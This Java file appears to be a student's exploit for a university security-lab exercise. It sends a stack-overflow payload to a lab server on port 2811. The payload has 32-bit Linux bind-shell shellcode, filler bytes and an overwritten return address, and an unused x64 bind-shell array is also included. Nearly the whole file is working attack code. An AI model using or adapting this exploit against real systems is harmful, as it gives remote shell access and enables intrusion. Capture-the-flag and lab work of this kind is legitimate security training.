package hhsocket;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Level3 {

    final static private int PORT = 2811;

    public static void haxx(int port, byte[] data) throws IOException {
        Socket sock = new Socket("seclab1.win.tue.nl", port);
        OutputStream os = sock.getOutputStream();
        InputStream in = sock.getInputStream();
        os.write("".getBytes());
        os.write(data);
        os.write("\r\n\r\n".getBytes());
        byte[] buffer = new byte[1024];
        int read;
        while ((read = in.read(buffer)) != -1) {
            System.out.print(new String(buffer, 0, read));
        }
        //System.out.println("");
    }

    public static void main(String[] args) throws IOException {
        int[] shellBindTCP9999x64 = new int[]{
            0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xf5, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x05, 0xef,
            0xff, 0xff, 0xff, 0x48, 0xbb, 0x06, 0x96, 0x16, 0x9a, 0x9c, 0x17, 0x96, 0xde, 0x48,
            0x31, 0x58, 0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0x6c, 0xbf, 0x4e,
            0x03, 0xf6, 0x15, 0xc9, 0xb4, 0x07, 0xc8, 0x19, 0x9f, 0xd4, 0x80, 0xc4, 0x19, 0x02,
            0xb2, 0x14, 0x9a, 0xbb, 0x18, 0xde, 0x57, 0xe0, 0xfc, 0x06, 0xc0, 0xf6, 0x26, 0xce,
            0xd1, 0x03, 0xfc, 0x24, 0xc2, 0x93, 0x12, 0xde, 0xef, 0xf0, 0xfc, 0x3d, 0xc2, 0x93,
            0x12, 0xde, 0x49, 0x6c, 0x95, 0x48, 0xd2, 0x63, 0xd9, 0xfc, 0xff, 0x5e, 0x99, 0x13,
            0xef, 0x6a, 0x7d, 0xad, 0x86, 0x9f, 0xde, 0xad, 0xb5, 0xfe, 0x7e, 0xf8, 0xf1, 0x75,
            0xfe, 0x16, 0xc9, 0xd4, 0x9e, 0x71, 0x8c, 0x51, 0xde, 0x9f, 0x7c, 0x93, 0x12, 0x96,
            0xde
        };
        byte shell[] = new byte[]{
            (byte) 0x6a, (byte) 0x66, (byte) 0x58, (byte) 0x6a, (byte) 0x01, (byte) 0x5b, (byte) 0x99, (byte) 0x52, (byte) 0x53, (byte) 0x6a, (byte) 0x02, (byte) 0x89,
            (byte) 0xe1, (byte) 0xcd, (byte) 0x80, (byte) 0x52, (byte) 0x43, (byte) 0x68, (byte) 0xff, (byte) 0x02, (byte) 0x11, (byte) 0x5C, (byte) 0x89, (byte) 0xe1,
            (byte) 0x6a, (byte) 0x10, (byte) 0x51, (byte) 0x50, (byte) 0x89, (byte) 0xe1, (byte) 0x89, (byte) 0xc6, (byte) 0xb0, (byte) 0x66, (byte) 0xcd, (byte) 0x80,
            (byte) 0x43, (byte) 0x43, (byte) 0xb0, (byte) 0x66, (byte) 0xcd, (byte) 0x80, (byte) 0x52, (byte) 0x56, (byte) 0x89, (byte) 0xe1, (byte) 0x43, (byte) 0xb0,
            (byte) 0x66, (byte) 0xcd, (byte) 0x80, (byte) 0x89, (byte) 0xd9, (byte) 0x89, (byte) 0xc3, (byte) 0xb0, (byte) 0x3f, (byte) 0x49, (byte) 0xcd, (byte) 0x80,
            (byte) 0x41, (byte) 0xe2, (byte) 0xf8, (byte) 0x52, (byte) 0x68, (byte) 0x6e, (byte) 0x2f, (byte) 0x73, (byte) 0x68, (byte) 0x68, (byte) 0x2f, (byte) 0x2f,
            (byte) 0x62, (byte) 0x69, (byte) 0x89, (byte) 0xe3, (byte) 0x52, (byte) 0x53, (byte) 0x89, (byte) 0xe1, (byte) 0xb0, (byte) 0x0b, (byte) 0xcd, (byte) 0x80
        };
        final int ptrsize = 4;
        final int prologueSize = 12;
        byte[] bbuf = new byte[128 + 1 + ptrsize];
        for (int i = 0; i < bbuf.length; i++) {
            if (i < shell.length) {
                bbuf[i] = shell[i];
            } else {
                bbuf[i] = (byte) i;
                switch (bbuf[i]) {
                    case -128:
                        bbuf[i] = (byte) 0xDE;
                        break;
                    case -127:
                        bbuf[i] = (byte) 0xC0;
                        break;
                    case -126:
                        bbuf[i] = (byte) 0xAD;
                        break;
                    case -125:
                        bbuf[i] = (byte) 0x0B;
                        break;

                }
            }
        }
        bbuf[bbuf.length - 1 - ptrsize] = 0x4c;
        bbuf[bbuf.length + 0 - ptrsize] = (byte) 0xec;
        bbuf[bbuf.length + 1 - ptrsize] = (byte) 0xff;
        bbuf[bbuf.length + 2 - ptrsize] = (byte) 0xbf;
        bbuf[bbuf.length + 3 - ptrsize] = 0;
        haxx(PORT, bbuf);
    }
}
